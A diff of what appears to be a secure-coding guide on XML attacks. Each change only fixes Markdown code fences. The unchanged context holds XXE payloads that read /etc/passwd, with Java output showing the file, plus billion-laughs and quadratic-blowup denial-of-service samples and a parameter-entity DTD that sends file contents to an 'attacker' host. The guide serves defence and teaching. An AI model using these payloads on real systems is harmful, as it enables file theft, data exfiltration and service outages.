@@ -53,7 +53,7 @@ According to the XML specification, the string `--` (double-hyphen) must not occ
   <!-- another comment
  comment -->
 </element>
-```text
+```
 
 #### Well-Formed Document to Well-Formed Document Normalized
 
@@ -63,7 +63,7 @@ Certain parsers may consider normalizing the contents of your `CDATA` sections. 
 <element>
  <![CDATA[<script>a=1;</script>]]>
 </element>
-```text
+```
 
 Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:
 
@@ -71,7 +71,7 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
 <element>
  &lt;script&gt;a=1;&lt;/script&gt;
 </element>
-```text
+```
 
 ### Handling coercive parsing
 
@@ -83,7 +83,7 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
   <A3>
    ...
     <A30000>
-```text
+```
 
 ## Violation of XML Specification Rules
 
@@ -104,7 +104,7 @@ Consider a bookseller that uses a web service through a web interface to make tr
  <id>123</id>
  <price>10</price>
 </buy>
-```text
+```
 
 **If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:
 
@@ -113,7 +113,7 @@ Consider a bookseller that uses a web service through a web interface to make tr
  <id>123</id><price>0</price><id></id>
  <price>10</price>
 </buy>
-```text
+```
 
 Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.
 
@@ -131,7 +131,7 @@ Notice again how the value 123 is supplied as an `id`, but now the document incl
  <name>John Doe</name>
  <age>11111..(1.000.000digits)..11111</age>
 </person>
-```text
+```
 
 The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.
 
@@ -157,7 +157,7 @@ Provided you need to use a hexadecimal value, there is no point in defining this
    <element ref="xenc:CipherReference"/>
   </choice>
  </complexType>
-```text
+```
 
 The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.
 
@@ -184,7 +184,7 @@ The following sample document defines an `id` for a product, a `price`, and a `q
  <price>10</price>
  <quantity>1</quantity>
 </buy>
-```text
+```
 
 **To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**
 
@@ -200,7 +200,7 @@ The following sample document defines an `id` for a product, a `price`, and a `q
   </xs:complexType>
  </xs:element>
 </xs:schema>
-```text
+```
 
 Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**
 
@@ -214,7 +214,7 @@ Limiting that `quantity` to an integer data type will avoid any unexpected chara
   <xs:restriction base="xs:positiveInteger"/>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.
 
@@ -236,7 +236,7 @@ Not considering the whole spectrum of possible values for a data type could make
   </xs:complexType>
  </xs:element>
 </xs:schema>
-```text
+```
 
 **The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**
 
@@ -267,7 +267,7 @@ After selecting the appropriate data type, developers may apply additional restr
   </xs:restriction>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.
 
@@ -284,7 +284,7 @@ Software applications, databases, and programming languages normally store infor
   </xs:restriction>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:
 
@@ -296,7 +296,7 @@ In cases where the possible values are restricted to a certain specific length (
   </xs:restriction>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 ##### Patterns
 
@@ -310,7 +310,7 @@ Certain elements or attributes may follow a specific syntax. You can add `patter
   </xs:restriction>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.
 
@@ -328,7 +328,7 @@ The *Divide by Zero* section above referenced the potential consequences of usin
   </xs:restriction>
  </xs:simpleType>
 </xs:element>
-```text
+```
 
 The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.
 
@@ -355,7 +355,7 @@ The assertion guarantees that the `denominator` will not contain the value zero 
   </xs:complexType>
  </xs:element>
 </xs:schema>
-```text
+```
 
 The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**
 
@@ -380,7 +380,7 @@ In most cases, the overall result will be a huge document. This is a short examp
                  LARGENAME2="LARGEVALUE2"
                  LARGENAME3="LARGEVALUE3" …>
  ...
-```text
+```
 
 #### "Small" Jumbo Payloads
 
@@ -392,7 +392,7 @@ In most cases, the overall result will be a huge document. This is a short examp
  <!ENTITY file SYSTEM "http://attacker/huge.xml" >
 ]>
 <root>&file;</root>
-```text
+```
 
 ### Schema Poisoning
 
@@ -421,7 +421,7 @@ In most cases, the overall result will be a huge document. This is a short examp
  <heading>Reminder</heading>
  <body>Don't forget me this weekend</body>
 </note>
-```text
+```
 
 All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**
 
@@ -437,13 +437,13 @@ All restrictions on the note element could be removed or altered, allowing the s
  <heading>Reminder</heading>
  <body>Don't forget me this weekend</body>
 </note>
-```text
+```
 
 **However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:
 
 ```text
 -rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
-```text
+```
 
 The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.
 
@@ -463,7 +463,7 @@ When documents reference remote schemas using the unencrypted Hypertext Transfer
  <heading>Reminder</heading>
  <body>Don't forget me this weekend</body>
 </note>
-```bash
+```
 
 The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .
 
@@ -478,14 +478,14 @@ When switching to HTTPS, the location of the remote schema will look like `https
 ```bash
 $ host example.com
 example.com has address 1.1.1.1
-```bash
+```
 
 If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:
 
 ```bash
 $ host example.com
 example.com has address 2.2.2.2
-```text
+```
 
 When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.
 
@@ -511,7 +511,7 @@ When third parties host and define schemas, the contents are not under the contr
   <lastname>&xxe;</lastname>
  </contact>
 </contacts>
-```text
+```
 
 **Sample DTD**:
 
@@ -521,7 +521,7 @@ When third parties host and define schemas, the contents are not under the contr
 <!ELEMENT firstname (#PCDATA)>
 <!ELEMENT lastname ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
-```text
+```
 
 ##### XXE using DOM
 
@@ -562,7 +562,7 @@ public class parseDocument {
   }
  }
 }
-```bash
+```
 
 The previous code produces the following output:
 
@@ -573,7 +573,7 @@ Last Name: ### User Database
 ...
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
-```text
+```
 
 ##### XXE using DOM4J
 
@@ -602,7 +602,7 @@ public class test1 {
   }
  }
 }
-```bash
+```
 
 The previous code produces the following output:
 
@@ -618,7 +618,7 @@ $ java test1
 ...
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
-```text
+```
 
 ##### XXE using SAX
 
@@ -648,7 +648,7 @@ public class parseDocument extends DefaultHandler {
   System.out.println(tmpValue);
  }
 }
-```bash
+```
 
 The previous code produces the following output:
 
@@ -659,7 +659,7 @@ John
 ...
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
-```text
+```
 
 ##### XXE using StAX
 
@@ -693,7 +693,7 @@ public class parseDocument {
  }
 }
 
-```bash
+```
 
 The previous code produces the following output:
 
@@ -703,7 +703,7 @@ $ java parseDocument
 ...
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
-```text
+```
 
 #### Recursive Entity Reference
 
@@ -716,7 +716,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
  <!ENTITY B "&A;">
 ]>
 <A>&A;</A>
-```text
+```
 
 #### Quadratic Blowup
 
@@ -730,7 +730,7 @@ The result of the following attack will be 100,000 x 100,000 characters in memor
  <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
 ]>
 <root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
-```text
+```
 
 #### Billion Laughs
 
@@ -751,7 +751,7 @@ The result of the following attack will be 100,000 x 100,000 characters in memor
  <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
 ]>
 <root>&LOL9;</root>
-```text
+```
 
 The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.
 
@@ -781,7 +781,7 @@ The following example illustrates a case where the parser is not following the s
   <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
  </SOAP:BODY>
 </SOAP:ENVELOPE>
-```text
+```
 
 #### Reflected File Retrieval
 
@@ -794,7 +794,7 @@ Consider the following example code of an XXE:
  <!ENTITY xxe SYSTEM "/etc/passwd">
 ]>
 <root>&xxe;</root>
-```text
+```
 
 **The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**
 
@@ -808,7 +808,7 @@ Consider the following example code of an XXE:
 
 ```xml
 <!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
-```text
+```
 
 ##### External Connection
 
@@ -820,7 +820,7 @@ Whenever there is an XXE and you cannot retrieve a file, you can test if you wou
  <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
  %xxe;
 ]>
-```text
+```
 
 ##### File Retrieval with Parameter Entities
 
@@ -834,7 +834,7 @@ Parameter entities allows for the retrieval of content using URL references. Con
  %dtd;
 ]>
 <root>&send;</root>
-```text
+```
 
 Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:
 
@@ -842,7 +842,7 @@ Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two exte
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
 %all;
-```text
+```
 
 The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.
 
@@ -858,7 +858,7 @@ The amount and type of information generated by port scanning will depend on the
 java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
  at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
  at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
-```text
+```
 
 **3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.
 
